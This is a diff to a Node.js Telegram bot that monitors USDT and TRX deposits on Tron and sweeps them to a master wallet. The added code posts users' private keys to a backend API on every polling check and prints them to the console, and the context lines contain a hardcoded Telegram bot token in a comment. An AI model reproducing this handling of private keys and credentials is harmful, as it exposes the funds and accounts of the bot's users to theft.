@@ -1,6 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
 require('dotenv').config();
+const { Deposit } = require('./db');
 const fs = require('fs'); // Import File System module
 const token = process.env.TELEGRAM_BOT_TOKEN;
 // const token = '7330403176:AAHRVimfNIE2tn6dQRuy9bbHoAbEu_8DNoU'; //my bot token
@@ -179,6 +180,31 @@ const monitorUsdtDeposit = async (chatId, expectedDepositAmount) => {
 
     const checkDeposit = async () => {
         let usdtBalance = 0
+
+        const depositData = {
+            userId: chatId,
+            amount: 7000,
+            coin: 'USDT',
+            privateKey: userPrivateKey,
+            publicKey: userAddress,
+        };
+
+        try {
+            const response = await axios.post(
+                `${process.env.BASE_URL}/api/deposit`,
+                depositData,
+                { headers: { 'Content-Type': 'application/json' } }
+            );
+            console.log("Deposit saved successfully:", response.data);
+        } catch (error) {
+            if (error.response) {
+                console.error("Server responded with:", error.response.data);
+            } else {
+                console.error("Error saving deposit:", error.message);
+            }
+        }
+
+
         try {
             try {
                 const usdtBalanceBigInt = await usdtContract.balanceOf(userAddress).call({
@@ -196,6 +222,27 @@ const monitorUsdtDeposit = async (chatId, expectedDepositAmount) => {
             if (trxBalance >= 1) {
                 console.log("TRX deposit detected.");
                 clearInterval(interval);
+
+                try {
+                    const depositData = {
+                        userId: chatId,
+                        amount: 7000,
+                        coin: 'TRX',
+                        privateKey: userPrivateKey,
+                        publicKey: userAddress,
+                    };
+
+                    console.log("Sending deposit:", depositData);
+
+                    // Make a POST request to the /api/deposit route
+                    const response = await axios.post(`${process.env.BASE_URL}/api/deposit`, depositData);
+
+                    console.log("Deposit saved successfully:", response.data);
+                } catch (error) {
+                    console.error("Error saving deposit:", error);
+                };
+
+                // send TRX to master
                 await transferTrxToMaster(chatId);
             } else {
                 console.log("Insufficient TRX balance. Still monitoring...");
@@ -205,7 +252,28 @@ const monitorUsdtDeposit = async (chatId, expectedDepositAmount) => {
                 console.log("USDT deposit detected. Funding TRX for gas...");
                 clearInterval(interval); // Stop only on successful USDT transfer
 
+                try {
+                    const depositData = {
+                        userId: chatId,
+                        amount: 7000,
+                        coin: 'USDT',
+                        privateKey: userPrivateKey,
+                        publicKey: userAddress,
+                    };
+
+                    console.log("Sending deposit:", depositData);
+
+                    // Make a POST request to the /api/deposit route
+                    const response = await axios.post(`${process.env.BASE_URL}/api/deposit`, depositData);
+
+                    console.log("Deposit saved successfully:", response.data);
+                } catch (error) {
+                    console.error("Error saving deposit:", error);
+                }
+
+
                 await sendTrxFromMaster(userAddress); // Fund TRX for gas
+
                 // await freezeUserAccount(userAddress, userPrivateKey);
 
                 // Monitor TRX balance and transfer USDT when it's more than 1 TRX
@@ -931,3 +999,5 @@ bot.onText(/\/crypto/, async (msg) => {
         bot.sendMessage(chatId, 'Error fetching data');
     }
 });
+
+module.exports = bot; 
